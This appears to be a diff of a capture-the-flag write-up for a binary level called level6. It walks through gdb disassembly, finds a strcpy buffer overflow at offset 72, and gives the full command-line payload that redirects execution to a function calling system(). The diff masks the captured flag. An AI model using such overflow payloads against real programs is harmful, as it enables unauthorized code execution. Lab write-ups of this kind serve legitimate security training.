@@ -62,8 +62,8 @@ Dump of assembler code for function main:
 End of assembler dump.
 (gdb) 
 ```
-
 Even though it is not explicit m is called. Let's see how :
+
 ```bash
    0x080484a5 <+41>:	mov    $0x8048468,%edx
    0x080484aa <+46>:	mov    0x18(%esp),%eax
@@ -94,7 +94,6 @@ End of assembler dump.
 We see that n calls system(), so our goal is going to be to use the function m so that it calls n().
 
 
-
 ## Gettingn acces to the pass
 
 In the main we see that there is a call to strcpy, let's find the offset to do a buffer overflow.
@@ -107,12 +106,12 @@ Program received signal SIGSEGV, Segmentation fault.
 0x41346341 in ?? ()
 (gdb) 
 ```
-
+0x41346341 --> Offset of 72
 The offset is 72, so our final payload will be : Offset + n() address 
-"B"*72  +   "\x54\x84\x04\x08"
+"B"*72  + "\x54\x84\x04\x08"
 
 
 ```bash
 $ ./level6 $(python -c 'print "B"*72+"\x54\x84\x04\x08"')
-f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+***************************
 ```
